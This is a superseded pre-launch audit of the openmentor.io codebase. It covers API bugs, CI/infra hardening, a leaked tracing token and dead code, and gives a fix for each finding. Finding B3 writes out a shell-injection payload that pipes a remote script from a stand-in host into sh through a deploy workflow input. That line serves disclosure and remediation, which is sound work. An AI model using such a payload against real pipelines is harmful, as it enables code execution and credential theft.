# Pre-Launch Repository Audit — openmentor.io

> **⚠️ Superseded — evidence only.** Use
> [`2026-08-remediation-plan.md`](./2026-08-remediation-plan.md) as the actionable plan.
> Verification overturned three findings below: **B4** (token in trace headers) is *refuted* — a latent
> misconfiguration, not an active leak; the claim that JWT validation is "algorithm-confusion guarded" is
> *imprecise* (the HMAC family is enforced, not HS256, and issuer/audience are never verified); and the
> claim that `normalizeRoute` bounds metric cardinality is *wrong* (500 unique ids produced 500 series).
> Retained as a record of what was checked.

**Date:** 2026-08-03
**Scope:** Full monorepo (`web/`, `api/`, `infra/`, `.github/`, `grafana/`, `docs/`, root)
**Method:** Five parallel deep audits (frontend, Go backend, security, infra/CI/docs, dependencies), each required to cite `file:line` evidence. The highest-impact findings were independently re-verified against the source before inclusion in this report.
**Audience:** A mid-level developer implementing the fixes. Each finding has a location, an explanation, and a concrete recommendation.

---

## 1. Executive summary

The codebase is in **good shape for a pre-launch project**. The core application security posture is genuinely strong: SQL is fully parameterized (with an allowlist on the one dynamic query), IDOR ownership checks are present, JWT tokens are audience/type-bound with algorithm-confusion guards, magic-link tokens are 256-bit, single-use, hashed at rest, captcha is enforced server-side on every public write, secrets are correctly git-ignored, app containers run as non-root, and CI uses OIDC with no long-lived AWS keys. That is a higher baseline than most projects reach at launch.

The findings are therefore concentrated in three places: **(a) a small number of correctness bugs that will bite real users on day one**, **(b) infrastructure/CI hardening gaps**, and **(c) a meaningful amount of dead code and duplication** — most notably a ~1,500-line mentor/admin frontend stack that is duplicated almost verbatim and has already drifted.

Nothing here is a redesign. The launch-blockers are all small, surgical fixes.

### Must-fix before launch (details in §3)

| # | Area | Issue | Effort |
|---|------|-------|--------|
| B1 | API | Nil S3 client → unrecovered goroutine panic crashes the whole API on the first real registration when S3 creds are missing/typo'd | S |
| B2 | API | Freshly-registered mentors have `NULL sort_order`; every profile/login read scans it into a plain `int` and errors — mentor can't log in or view profile until a worker job runs | S |
| B3 | Security/CI | Shell-injection path: `image_tag` dispatch input is interpolated raw into the `ssh` line in `deploy.yml`, giving any write-access user code-exec on the deploy runner (AWS OIDC role + VM SSH key) and the prod VM | S |
| B4 | Web | Internal Go-API auth token value is recorded into OpenTelemetry client spans and exported to Grafana Cloud | XS |
| B5 | Web | Contact-mentor flow returns generic 500 for upstream 4xx **and** never resets the single-use Turnstile token, so every retry after a failure is guaranteed to fail until a full page reload — on the platform's primary conversion path | S |
| B6 | API | `mentors/confirm/resend` rate limiter is IP-keyed behind a single-source-IP BFF, collapsing to **2 resends per 5 minutes for the entire platform** | S |
| B7 | Web | Donate CTA (the only revenue mechanism) points at a placeholder Ko-fi account; amount picker is decorative | XS |
| B8 | Infra | Backup sidecar fails fast when `BACKUP_S3_BUCKET` is set but `BACKUP_AWS_*` are empty, while the `.env.production.example` comment says it falls back to `S3_*` — crash-looping sidecar fails the deploy | XS |
| B9 | Repo | `CODEOWNERS` is syntactically invalid (`@glamcoder` with no path pattern) → assigns no owners; `web/.gitignore` line is mangled so `web/.idea/` (fork leftover) is committed | XS |

Effort key: XS ≈ minutes, S ≈ <½ day, M ≈ 1–2 days, L ≈ 3+ days.

### One correction worth calling out
The dependency audit initially flagged Next's bundled `sharp@0.34.5` (vulnerable libvips) as a launch-blocking RCE on user-uploaded images. On verification this is **overstated**: every `<Image>` in the app sets `unoptimized` and there is no custom loader, so Next's optimizer — and `sharp` — is bypassed on the render path. `sharp` is effectively an unused dependency. The `/_next/image` endpoint technically remains reachable, so applying the override is still worthwhile, but this is **Medium, not a blocker** (see D2/M-tier).

---

## 2. How to use this document

Fixes are grouped into four implementation phases in §5. Phase 0 is the launch-blocker set (the table above). Phases 1–3 are ordered by value/risk and can land after launch. Each finding below carries an ID (`Bn`, `An`, `Wn`, `Sn`, `In`, `Dn`) referenced by the plan.

Every finding was cited with `file:line` by the auditing pass; line numbers are accurate as of commit `9b63e73` but treat them as starting points, not literals.

---

## 3. Launch blockers (Phase 0) — detailed

### B1 — Nil S3 client causes an unrecovered goroutine panic (API, correctness)
**Where:** `api/cmd/api/main.go:272-284`, `api/internal/services/registration_service.go:200`, `api/pkg/s3storage/storage.go:240-253`
`storageClient` is only constructed when `S3_STORAGE_ACCESS_KEY`/`SECRET` are set (`main.go:273`); otherwise it stays `nil` and is injected into the services anyway. `config.Validate()` has **no S3 validation**. `RegisterMentor` unconditionally calls `s.storageClient.UploadImageAllSizesAsync(...)`, which spawns a bare `go func()` with **no `recover()`**. A nil receiver panics on first field access, and an unrecovered panic in a detached goroutine terminates the entire process. The API boots fine and dies on the first registration-with-photo. (The synchronous profile-picture path only 500s, because Gin's recovery middleware catches it.)
**Fix:** (a) validate S3 config at startup in production, same as JWT/`WORKER_AUTH_TOKEN`; (b) nil-guard `storageClient` in both `ProfileService` and `RegistrationService` (return an "uploads disabled" error); (c) add `defer func(){ recover() }()` (or a small `SafeGo` helper) inside `UploadImageAllSizesAsync`'s goroutine so no background upload can ever take down the process. Do (c) regardless — a bare goroutine on a request path should never be able to crash the server.

### B2 — NULL `sort_order` breaks reads for freshly-registered mentors (API, correctness)
**Where:** `api/internal/services/registration_service.go:150-170` (inserts `sort_order = nil`), `api/internal/repository/mentor_repository.go:115,379,547` (select raw `sort_order`), `api/internal/models/mentor.go:35,142` (`SortOrder int`, scanned via `&m.SortOrder`)
Registration inserts a NULL `sort_order`; it stays NULL until the worker's `new-mentor-watcher` finalizes the row. Meanwhile every `ScanMentor` path (`GetByEmail`, `fetchMentorByUUIDFromDB`, `FetchSingleMentorFromDB`) scans the column into a non-pointer `int`, which pgx rejects for NULL. Result: between registration and worker finalization — **forever** if the worker is down or the trigger URL is unset — the mentor cannot request a login link (`GetByEmail` fails → generic "not found") and `GET /mentor/profile` 404s. The code already knows the fix elsewhere: `GetForModerationByID` uses `COALESCE(m.sort_order, 0)` (`:668`).
**Fix:** `COALESCE(sort_order, 0)` in the three `ScanMentor` queries (or set a non-null `sort_order` at INSERT time). Prefer COALESCE — it's the pattern already in the file.

### B3 — Shell injection via `image_tag` in the deploy workflow (security, CI)
**Where:** `.github/workflows/deploy.yml:244` (interpolation), input at `:176-182`
The "Set image tag" step correctly passes the dispatch input through `env:` — but the **"Set image tags on VM"** step then interpolates the resulting output directly into the ssh command line:
`... "bash -s" -- "${{ github.event.inputs.service }}" "${{ steps.tag.outputs.TAG }}" <<'TAG_SCRIPT'`.
Because `TAG` equals the free-text input verbatim, a tag like `x"; curl evil.sh | sh; echo "` executes on the runner (which holds the OIDC AWS role and `VM_SSH_KEY`) and is forwarded to the VM's bash. Any collaborator with `workflow_dispatch` (write) access escalates to VM code-exec + AWS creds, bypassing code review.
**Fix:** pass `TAG` (and `service`) via `env:` and reference `"$TAG"` inside the `run:` block, exactly as the tag-computation step already does. Optionally validate the input against `^[A-Za-z0-9._-]+$`.

### B4 — Internal API token exported into trace spans (web, security)
**Where:** `web/src/lib/tracing-server.ts:60-68`
`getNodeAutoInstrumentations` is configured with `headersToSpanAttributes.client.requestHeaders: ['x-internal-mentors-api-auth-token']`, which records the **value** of the internal Go-API auth token (sent on every proxy call, `go-api-client.ts:93`) as a span attribute on every outgoing client span — exporting the shared secret to the OTLP endpoint / Grafana Cloud, readable by anyone with trace access. This undercuts the PII masking and token redaction done everywhere else.
**Fix:** delete the `headersToSpanAttributes` block, or capture only header *presence* as a boolean. One-line change.

### B5 — Contact flow swallows 4xx into 500 and never resets Turnstile (web, correctness)
**Where:** `web/src/pages/api/contact-mentor.ts:24-29` (and `api/schedule-migration.ts`, `api/reviews/submit.ts`, `api/reviews/check.ts`); `web/src/components/forms/ContactMentorForm.tsx` (no reset effect)
Two compounding bugs on the platform's most important conversion path. (1) `contact-mentor.ts` catches all upstream errors and returns a generic 500, so a Turnstile rejection or a 4xx validation error surfaces to the user as "Something went wrong" — even though `lib/api-proxy.ts#sendUpstreamError` exists precisely to forward 4xx contracts and is used by ~25 other routes. (2) The form never resets the single-use Turnstile widget after a failed submit; `RegisterMentorForm.tsx:199-210` has a comment explaining exactly why this is required, but the fix was never ported. Net effect: after any failed contact attempt, every retry reuses the spent token and fails until a full page reload.
**Fix:** switch the four hand-rolled routes to `sendUpstreamError`; copy the `isError → turnstileRef.reset()` effect from `RegisterMentorForm` into `ContactMentorForm`.

### B6 — Resend rate limiter is a single global 2-per-5-min bucket (API, correctness)
**Where:** `api/cmd/api/main.go:64` (uses IP-keyed `.Middleware()`), limiter defined `NewRateLimiter(0.00667, 2)`
The code itself documents (`main.go:101-105`) that all traffic arrives from the BFF's single source IP, which is why the login limiters were re-keyed by email via `EmailRateLimitMiddleware`. But `confirmResendRateLimiter` still uses the IP-keyed `.Middleware()`, so under the documented deployment it's **2 confirmation resends per 5 minutes for the entire platform** — during a launch surge, most users clicking "resend email" get a 429. The `contactRateLimiter` (5/s shared across contact + reviews + migration) has the same structural issue, less acutely.
**Fix:** re-key the resend limiter on the confirmation token/email (the token identifies the mentor) using the `EmailRateLimitMiddleware` pattern. Consciously document the contact limiter as an intentional global cap, or key it too.

### B7 — Donate CTA is a placeholder; amount picker is decorative (web, pre-launch)
**Where:** `web/src/config/donates.ts:3-5` (TODO), consumed by `donate.tsx:31,112-120`, promoted on `index.tsx:341-348`, cited in `public/llms.txt`
The site's only revenue mechanism links to `https://ko-fi.com/openmentor`, explicitly marked a placeholder. The `$3/$10/$25/Custom` buttons only change the label — the Ko-fi link ignores the selection.
**Fix:** confirm/replace the real Ko-fi account before launch; either wire the selected amount into the Ko-fi URL (Ko-fi supports amount params) or remove the picker.

### B8 — Backup-credential contract contradicts the sidecar (infra)
**Where:** `infra/.env.production.example:135-137` vs `infra/postgres-backup/backup.sh:55-59`; same stale claim in `backup.sh:18-21` and `docs/runbooks/postgres-backup-restore.md:119`
The template says the sidecar falls back to `S3_STORAGE_*` when `BACKUP_AWS_*` are empty, but `backup.sh` **fails fast** in that case. The template pre-fills `BACKUP_S3_BUCKET`, so an operator following the comment gets a crash-looping sidecar (`restart: always` + exit 1), and `deploy-remote.sh:173-178` then fails the deploy and rolls back — a rollback that can't fix the config. `infra/.env.example:97-105` already has the correct wording.
**Fix:** update the three stale comments to match the fail-fast behavior. Trivial, but it will break the first production deploy if left.

### B9 — Invalid CODEOWNERS and committed IDE folder (repo hygiene)
**Where:** `/CODEOWNERS` (contents: `@glamcoder`, no pattern, no newline); `web/.gitignore:47` (`.ideaweb/public/sample-images/` — two entries mashed together)
CODEOWNERS entries must be `<pattern> <owner>`; a bare `@glamcoder` assigns **no owners**, so any "require code-owner review" rule silently matches nothing. Separately, the mangled `.gitignore` line means `web/.idea/` is tracked, including the fork leftover `getmentor.dev.iml`.
**Fix:** CODEOWNERS → `* @glamcoder` (with trailing newline). `.gitignore` → split into `.idea/` and `public/sample-images/`, then `git rm -r --cached web/.idea`.

---

## 4. Findings by area (Phases 1–3)

Severity reflects impact **after** the launch-blockers are fixed. Full `file:line` evidence was captured for each; representative locations shown.

### 4.1 API backend (Go)

**High / notable**
- **A1 (M3, inefficiency)** `GetMentorByID` loads the entire catalog (full `mentors × mentor_tags × tags` aggregate with a per-row `COUNT(*)` subquery) then linearly scans for `legacy_id`, on a 100 r/s endpoint. `legacy_id` is already uniquely indexed. — `mentor_repository.go:51-64`. **Fix:** add a `WHERE m.legacy_id = $1` single-mentor query (slug/UUID variants already exist; ~5-line copy).
- **A2 (M2, correctness)** Registration silently drops unknown tags (logs "Tag not found" and continues) — the exact bug `resolveTagsStrict` was written to prevent, and which happened in production with the "Security" tag. — `registration_service.go:139-148` vs `tags.go:23-33`. **Fix:** use `resolveTagsStrict` in `RegisterMentor`.
- **A3 (M8, correctness)** Profile save isn't atomic (row `Update` and `UpdateMentorTags` are separate ops; a tags failure is logged but success is still returned, so text and tags can diverge) **and** a mentor can never clear `calendar_url` (`if req.CalendarURL != ""` guard), while admin update always writes it — the two flows disagree. — `profile_service.go:108-131`. **Fix:** one transaction for row+tags; write `calendar_url` unconditionally.

**Medium**
- **A4 (M1)** `UpdateProfile` maps every service error to 500, including the typed `NotFoundError`/`InvalidInputError` its siblings map correctly — a stale tag name yields a 500 + spurious PostHog `$exception` instead of a 400. — `mentor_profile_handler.go:96-107`.
- **A5 (M4)** HTTP status decided by `strings.Contains(err.Error(), "not found"/…)` in three handlers; the migration handler matches the user-facing message. Rewording a message silently changes a status code. — `admin_mentors_handler.go:206-226`, `admin_mentor_requests_handler.go:121-133`, `migration_intent_handler.go:36-41`. **Fix:** sentinel errors (already the norm elsewhere).
- **A6 (M9)** Analytics tracker has no `Close()`/drain; up to 512 buffered events are dropped on every deploy and the worker goroutine leaks. Also `DefaultPostHogHost` here is `us.i.posthog.com` while config defaults to `eu.i.posthog.com` — a drift could ship EU data to the US. — `pkg/analytics/tracker.go:139-190`.
- **A7 (M10)** `turnstile.Verify(token)` takes no `ctx` (drops request cancellation/trace on a hot path) and never checks `resp.StatusCode` (a Cloudflare 5xx becomes a confusing JSON error). — `pkg/turnstile/turnstile.go:41-66`.
- **A8 (M11)** Login-token verify is read-then-clear, not atomic: two concurrent verifies can both mint a session from a "single-use" token. Low exploitability (token comes from the victim's inbox). — `mentor_auth_service.go:203-247` (+ admin). **Fix:** `UPDATE … WHERE login_token=$1 AND expires_at > NOW() RETURNING …`.
- **A9 (M6)** Missing indexes: `mentors.login_token` has none (every verify is a seq scan; `moderators.login_token` has one — asymmetry); `mentors.email` only has a partial unique index that all-status lookups can't use. Redundant: `mentors_slug_idx` duplicates the `UNIQUE` constraint. — `migrations/000001_initial_schema.up.sql`. Low impact at current volume; cheap now.
- **A10 (M5)** `000002_populate_tags` has no `.down.sql`; a rollback past v2 fails and strands the schema. — `api/migrations/`.
- **A11 (M7)** Profile-picture path decodes the same base64 5–6× per request and uploads identical bytes 3× (`full/large/small`) — ~80 MB transient allocs + 3× egress per upload (acknowledged tech debt). — `pkg/s3storage/storage.go:191-233`. **Fix:** decode once, pass `[]byte`; upload once + S3 `CopyObject`, or store one object until real thumbnailing exists.
- **A12 (M12)** `frontend.log` has no rotation (lumberjack rotates `app.log`/`error.log` but not this sink); legitimate traffic fills the volume over time. — `logs_handler.go:62-106`.
- **A13 (L13)** Contact requests are accepted for non-public mentors (row inserted before checking mentor status; only the FK stops nonexistent UUIDs) — draft/declined mentors can be contacted via the API. — `contact_service.go:96-105`.

**Low / cleanup**
- **A14** Dead config knobs: `DB_WORK_OFFLINE`/`WorkOffline` (nothing implements offline mode), `DatabaseConfig.MaxConns/MinConns` (hardcoded 20/2 despite looking configurable). — `config/config.go:54,277-279`.
- **A15** Dead code: `pkg/errors` unused sentinels/constructors (`ErrConflict`, `ErrUnauthorized`, `ErrInternal`, `ErrAccessDenied`, `AccessDeniedError`, `InternalError`); `db.Close()` helper; `GetAllTags`; `MentorProfileViews` metric (registered, never incremented); `templates.Names()`; commented-out webhook block at `profile_service.go:180-188`.
- **A16** Duplication: mentor vs admin auth stack (`mentor_auth_service.go` ~317 ln ≈ `admin_auth_service.go` ~234 ln, plus mirrored handlers/middlewares); four near-identical `crypto/rand` token generators; the 22-column mentor SELECT list appears verbatim 3× and `GetByLoginToken` hand-rolls a 4th scan instead of reusing `ScanMentor`. **Fix:** one generic magic-link service parameterized by repo+prefix+events; a `mentorSelect` const like `clientRequestSelect` already is.
- **A17** `Update()` latent SQL bugs: empty `updates` map → `SET , updated_at=…` (syntax error); `"updated_at"` in the allowlist → duplicate assignment. No caller hits them today. Guard `len==0`, drop `updated_at` from the allowlist. — `mentor_repository.go:157-190`.
- **A18** Hardcoded `https://openmentor.io/reviews/new?...` in a scan function ignores `BASE_URL` — staging links point at prod. — `models/mentor_client_request.go:214-216`.
- **A19** Tags cache over-engineered: `patrickmn/go-cache` for one key wrapped in a second mutex, `refresh()` drops the caller's ctx (`context.Background()`), `Get()` returns the map by reference, and `main.go:286-302` does a construct-discard-reconstruct dance. A ~30-line struct would be simpler and drop the dependency.
- **A20** Cron has no explicit timezone (`cron.New` without `WithLocation`) — a base-image TZ change silently shifts jobs. Pin `cron.WithLocation(time.UTC)`. — `worker/cron.go:60-66`.
- **A21** Doc/contract contradictions in env: `DISCORD_MENTORS_PRIVATE_INVITE_LINK` (`.env.example:113` "leave empty" vs `worker/jobs.go:57-60` "required"); `MentorUpdatedTriggerURL` fired but `.env.example:73` says the worker has no endpoint for it. Reconcile.
- **A22** Process-lifetime goroutine nits (unstoppable metrics ticker TODO, `RateLimiter.Stop()` never called, unbounded `trigger.CallAsync` not drained at shutdown → a deploy can lose in-flight trigger emails). Low impact; document or wire a stop.

**API test-coverage gaps (all critical-path):** `internal/repository/*` has **zero tests** (including `ChangeSlug`'s advisory-lock transaction and the `Update` query builder); auth services (`mentor_auth`, `admin_auth`, `mentor_confirmation`), `pkg/jwt`, and both session middlewares are untested; `contact`/`review`/`mentor_requests`/`migration_intent` services untested; 11 of 16 handlers untested. **Highest-value additions:** JWT + session-middleware tests, an auth-service suite (expiry, single-use, eligibility), and a dockerized repository test for `ChangeSlug`/`CreateMentor`.

**API verified clean:** `go build`/`go vet` pass; no unused go.mod deps; graceful shutdown (SIGINT/SIGTERM drain with timeouts, in-flight cron wait, tracer/profiler/pool close); SQL fully parameterized + column allowlist; JWT HS256 with method check, exp/nbf/iat, constant-time compare, mentor/admin cross-rejection; magic-link tokens hashed + single-use + 15-min TTL + eligibility re-check; enumeration-safe login; the `ChangeSlug` advisory-lock transaction is race-correct as written; worker jobs have per-mentor failure isolation + panic recovery + tracing; observability wiring (multi-tracer fan-out, bounded label cardinality, trace-id correlation) is correct.

### 4.2 Web frontend (Next.js)

Router: Pages Router only (no `app/`), BFF pattern (all data via Next API-route proxies). TS strict, no `any` in source, no commented-out code blocks.

**High**
- **W1 (H4, duplication)** ~1,500+ lines of mentor vs admin auth/API stack duplicated near-verbatim and **already drifted**: `mentor-admin-api.ts` (290) ≈ `admin-moderation-api.ts` (311) (identical `ApiError`, fetch wrapper, session cache, request/verify/logout); the four `api/{admin,mentor}/auth/*` route pairs differ by a handful of lines; the two AuthContexts and login/callback pages mirror each other; inside `go-api-client.ts`, `request()` and `requestWithCookies()` duplicate the whole fetch/timeout body. **Fix:** one generic `apiRequest`/`ApiError` parameterized by base path; a `createAuthContext(sessionEndpoint)` factory; one parameterized verify/session/logout handler; collapse the two client methods into one with a cookie-forwarding flag. (This is the single biggest maintainability win in the repo — every future auth fix currently has to be made twice.)

**Medium**
- **W2 (M1, architecture)** Seven fully-static pages (`about`, `terms`, `privacy`, `faq`, `donate`, `bementor`, `migrate`) each define a `getServerSideProps` whose only job is to write a log line, forcing SSR on every request with no CDN caching. No `getStaticProps` exists anywhere. **Fix:** drop SSR from the static pages (Next will static-optimize them); for `/` and `/mentors`, add `Cache-Control: s-maxage=60, stale-while-revalidate=300` like `sitemap.xml.ts` already does. Delete the per-page logger boilerplate (Faro/PostHog/GTM + proxy logs already capture page views).
- **W3 (M2, inefficiency)** The homepage ships the full mentor list — including up-to-5,000-char `competencies` — into `__NEXT_DATA__`, and the `experimental.largePageDataBytes: 10MB` override (`next.config.js:42-44`) exists only to silence Next's payload warning. `/mentors` already projects card fields; the homepage doesn't. **Fix:** project homepage props to `MentorCardItem` + the fields search uses, then remove the override.
- **W4 (M3, correctness)** Catalog search's haystack includes `description`/`about`, but the homepage (the only `useMentors` consumer) fetches with `drop_long_fields: true`, so those are always empty — bio search silently never matches. — `hooks/useMentors.ts:52-65`. **Fix:** drop the two fields from the haystack, or fetch them if bio search is a requirement.
- **W5 (M4, dead code)** Every `<Image>` uses `unoptimized` (21 usages, no custom loader), so `images.remotePatterns` gates nothing and `sharp` (`package.json:52`) is an unused production dependency shipped in the runner image. The backend pre-generates size variants, so this may be semi-deliberate. **Fix:** either drop `unoptimized` and let Next serve resized/AVIF/WebP, **or** keep `unoptimized` and delete `remotePatterns` + `sharp`. Today it's the worst of both. (See D2 for the security angle on the `/_next/image` endpoint.)
- **W6 (M6, duplication)** `selectStyles` (+ image validation, `isValidUrl`, `tagOptions`, `MAX_TAGS`) copy-pasted between `RegisterMentorForm` and `ProfileForm`, and ProfileForm's copy is a **stale revision** — it's missing the redesign's focus ring/borders/transitions, producing a visible inconsistency in the profile-edit tag select. **Fix:** extract to `components/forms/shared.ts`, keep the newer styles.
- **W7 (M7, config)** GTM container `GTM-5GLW4WPS` is hardcoded in `_app.tsx:97-105` and initializes regardless of `NEXT_PUBLIC_ANALYTICS_PROVIDER` — so `provider=none` doesn't actually disable tracking, and anyone self-hosting this AGPL app ships analytics to openmentor's container. Adjacent comment references a different (fork-era) container. **Fix:** move to `NEXT_PUBLIC_GTM_ID` (skip init when unset), gate behind the provider flag, delete the stale comment.
- **W8 (M8, correctness/dup)** Calendar iframes bypass the `safeHttpUrl` guard that the plain-link branch uses; `Koalendar.tsx` and `CalendlabWidget.tsx` are identical except iframe height, and both blindly append `?embed=true` even when the URL already has a query string. Defense-in-depth (CSP `frame-src`, server-side calendar classification) covers it, but the client guard is inconsistent. **Fix:** merge into one `CalendarEmbed({url,height})` that applies `safeHttpUrl` and appends params via `URL`/`searchParams`. (Note: CSP `frame-src` allows `calendlab.ru` while the detector matches `calendlab.com` — `api/internal/models/mentor.go:243` — so calendlab iframes would currently be CSP-blocked. Reconcile the domain.)
- **W9 (M9, dead code)** Verified-unused exports: `faro.ts` `getFaro/pushEvent/pushError/setUser`; `logger.ts` `createContextLogger`; `with-observability.ts` `measureAsync/measureSync`; `with-ssr-observability.ts` `withStaticPropsObservability` (no `getStaticProps` exists); `mentor-admin-api.ts` `isSessionValid`; `server/mentors-data.ts` `getOneMentorById/getOneMentorByUuid` + their `GoApiClient` backers; `constants.ts` `CACHE_REFRESH_INTERVAL` (Airtable-cache leftover). **Fix:** delete; consider adding `knip` or `eslint-plugin-unused-exports` to CI.
- **W10 (M11, duplication)** `mentor/index.tsx` and `mentor/past.tsx` share byte-identical `filterRequests`/`sortRequests` and a ~70% identical page body. **Fix:** move helpers to the existing `components/mentor-admin/utils.ts`; extract a `RequestsPageShell`.

**Web test-coverage gaps:** the entire authenticated surface is untested — all 8 auth API routes (incl. the duplicated Set-Cookie forwarding), both client API libs + AuthContexts, login/callback pages, the requests inbox + its 4 routes, `ProfileForm` (649 ln), admin moderation UI (`admin/mentors/[id].tsx`, 945 ln), the reviews flow, and `api/metrics` token auth. **Priority:** auth verify/session routes (cookie forwarding), requests status transitions, ProfileForm save, reviews submit. The `node-mocks-http` pattern already in the repo makes these cheap.

**Low:** `start2`/`dev2` duplicate npm scripts (`package.json:9-10`); Dockerfile stale commented COPY + misleading comment (`web/Dockerfile:113-131`) and `POSTHOG_PERSONAL_API_KEY` in build ARG layer metadata (prefer `--mount=type=secret`); stray tracked/untracked artifacts (`web/.git/` nested dir, `web/logs/*`, `coverage/`, `tsconfig.tsbuildinfo`, `yarn-error.log`); base64 body-limit mismatch — client caps raw file at 10 MB but proxies cap the base64 body at `10mb`, so ~7.4–10 MB files pass then 413 (`api/mentor/profile/picture.ts:45-47`); prop mutation in the contact success path (`contact.tsx:265`); `filter-sourcemaps.js:73` emits maps with `mappings:''` (dead in Faro); `web/CLAUDE.md` references a nonexistent `FilterGroupDropdown.tsx`; `react-calendly` is a single-use heavy dep that could fold into `CalendarEmbed`.

**Web verified clean:** every runtime dependency except `sharp` is actually imported; env-var contract reconciles exactly with `.env.example` + `env.d.ts`; no `any`; internal links all resolve; sanitizer allowlist + scheme restriction + XML/JSON-LD escaping correct; timing-safe `/api/metrics` compare; multi-cookie `getSetCookie()` forwarding; strict CSP + security headers; enumeration-safe login; consent-gated analytics.

### 4.3 Infrastructure, CI, docs

**Medium**
- **I1 (M2, security)** `env_file: .env.runtime` (the full production env) is attached to **every** service including the internet-facing frontend, so the frontend container holds `JWT_SECRET`, SES/S3 keys, `CLOUDFLARE_DNS_API_TOKEN`, DB creds, etc. One compromised service leaks the whole secret set. **Fix:** per-service env files or an explicit `environment:` allowlist for the frontend at minimum. — `infra/docker-compose.yml:94,218,...`.
- **I2 (S-M4, security)** Docker socket mounted (`:ro`) into internet-facing Traefik, and cAdvisor mounts `/`, `/var/run`, `/var/lib/docker`. `:ro` does not restrict Docker API calls — an RCE in Traefik = host root. **Fix:** front the socket with a filtering proxy (docker-socket-proxy) exposing only what Traefik needs; add `no-new-privileges:true`. — `docker-compose.yml:59,69-74`.
- **I3 (S-M5)** No container-hardening directives anywhere (`cap_drop`/`read_only`/`no-new-privileges`); Traefik, cAdvisor, Alloy, postgres-backup run as root. (App images correctly drop to uid 1001.) **Fix:** `cap_drop: [ALL]` + `no-new-privileges:true` broadly; `read_only` + tmpfs where feasible.
- **I4 (M1)** `deploy.yml` frontend build passes only 5 build-args while `infra/deploy.sh` passes ~20 — a frontend shipped via the Deploy **workflow** bakes empty `NEXT_PUBLIC_POSTHOG_*`, `NEXT_PUBLIC_FARO_*`, `NEXT_PUBLIC_APP_ENV`, etc. and skips sourcemap upload, silently disabling client analytics/RUM depending on the deploy path. — `deploy.yml:92-97`. **Fix:** pass the same args or document the gap.
- **I5 (M4)** No Docker stdout log rotation — postgres/traefik/alloy/cadvisor log only to stdout with no `logging:` opts and no `daemon.json` log-opts in provisioning → unbounded json-file growth on a 4 GB VM. **Fix:** an `x-logging` anchor with `max-size`/`max-file`.
- **I6 (M3)** cAdvisor is the only long-running service with no `restart:` policy (defaults to `no`); after a VM reboot it stays down and breaks the container-metrics scrape/alerts. **Fix:** `restart: always`.
- **I7 (M5)** Restore runbooks (`postgres-backup-restore.md:31-32`, `postgres-16-to-18-upgrade.md:100-101`) run `aws s3 ...` "on the VM", but the design removed the AWS CLI and creds from the VM (`deploy-remote.sh:33-36`); `provisioning.md:93` still installs `awscli`, contradicting it. In a real incident the restore fails at step 2. **Fix:** document fetch-to-workstation + `scp`, or officially keep awscli + backup creds on the VM.
- **I8 (M7, security)** Dependabot has no `github-actions` ecosystem (so action pins never update — relevant to S1 below) and omits `infra/postgres-backup/Dockerfile`. — `.github/dependabot.yml`.
- **I9 (M8)** Env vars read by `api/config/config.go` but missing from **both** infra templates: `BASE_URL`, `ALLOWED_CORS_ORIGINS`, `TRUSTED_PROXIES`, `JWT_ISSUER`, `SESSION_TTL_HOURS`, `LOGIN_TOKEN_TTL_MINUTES`, `COOKIE_DOMAIN`, `COOKIE_SECURE`, `WORKER_DB_MAX_CONNS`, `DB_WORK_OFFLINE`. All have prod-safe defaults today, but `ENVIRONMENT_VARIABLES.md` calls the templates authoritative and CLAUDE.md requires consistency — a `--staging` deploy silently inherits prod `BASE_URL`/CORS. **Fix:** add them to the templates.

**Low:** `if: always()` deploy gate can tag an image that never built (`deploy.yml:162`); two workflow steps inline `go test` commands instead of calling make targets, against the CLAUDE.md rule (`checks.yml:124`, `ci-api.yml:58-62`); `cancel-in-progress` also cancels post-merge verification on `main` (`checks.yml:33-35`); `api/Dockerfile` `go build -a` defeats cache + obsolete `-installsuffix cgo`; numerous doc drifts (binary name `/app/main` vs `/app/openmentor-api`, alloy version, `certs/` dir that doesn't exist, `docker-compose` v1 syntax, ACME troubleshooting assumes HTTP-01 while prod uses DNS-01, `backup.sh` path in one runbook); `FUNDING.yml` ko_fi placeholder (ties to B7); `infra/package-lock.json` empty stub (delete); `web/package.json` missing `"license"` field; grafana `ContainerHighCPU/Memory` alerts never fire (cAdvisor exposes no per-container `name` series) — fix cAdvisor labels or remove the rules.

**Infra verified clean:** real env files git-ignored (only `*.example` committed); every var in the templates is consumed (no orphans); backup strategy is genuinely good (external volume + Hetzner snapshots + nightly `pg_dump -Fc` to S3 with retention pruning + dedicated IAM + quarterly-drill runbook + stated RPO/RTO); compose has `mem_limit` on all 9 services, healthchecks on the app services, correct `depends_on` chain; only Traefik publishes 80/443 (postgres/backend/worker have no `ports:`); HSTS/security headers + edge rate limit; the required-checks gate matches the documented design (fast checks in `checks.yml`, deep checks in the CI workflows, no duplication); all 5 Grafana dashboards valid with no volatile fields; LICENSE is genuine AGPL-3.0 consistent across README/CONTRIBUTING/SECURITY; every documented command exists.

### 4.4 Security (cross-cutting) — beyond the blockers

- **S1 (M2)** Third-party actions pinned to mutable tags, not SHAs (`aws-actions/configure-aws-credentials`, `dorny/paths-filter`, `securego/gosec`, `docker/*`, `actions/*`) across all workflows — a hijacked tag in `deploy.yml` exfiltrates the OIDC AWS creds + `VM_SSH_KEY` (tj-actions-style). **Fix:** pin every `uses:` to a 40-char SHA with a version comment; pairs with I8 (Dependabot `github-actions`).
- **S2 (M1)** CSP allows `script-src 'unsafe-inline'` (`web/next.config.js:114`), defeating much of CSP's XSS value; otherwise strong (`object-src 'none'`, `base-uri 'self'`, no `unsafe-eval`). Comment marks it temporary. **Fix:** adopt Next's per-request nonce CSP, drop `'unsafe-inline'`.
- **S3 (L1)** SSH host-key pinning is optional — if `VM_SSH_HOST_KEY` is unset, `deploy.yml:206-211` falls back to `ssh-keyscan` (TOFU) with only a warning, so a MITM of the ephemeral runner could intercept the deploy and the piped ECR token. **Fix:** confirm the secret is populated; make the keyscan branch fatal.
- **S4 (L2)** gosec SARIF upload can never succeed: `ci-api.yml` job runs under `contents: read`, but `upload-sarif` needs `security-events: write`, and `continue-on-error: true` masks the failure — findings never reach the Security tab despite README claiming they do. (Same as I/H2.) **Fix:** scope `security-events: write` to the security job.
- **S5 (L4/L7)** In-network plaintext trust zone: prod `DATABASE_URL` uses `sslmode=disable`, backend↔worker and Traefik↔frontend are plain HTTP, and `/api/metrics` (rate-limited) + worker `/metrics` (unauth) are open — all only on the internal bridge, so it's an accepted single-host trust model; documented. Note for when the deployment grows beyond one host. Also: Traefik dashboard API is enabled but unrouted (`docker-compose.yml:15`) — a loaded footgun; remove until needed.
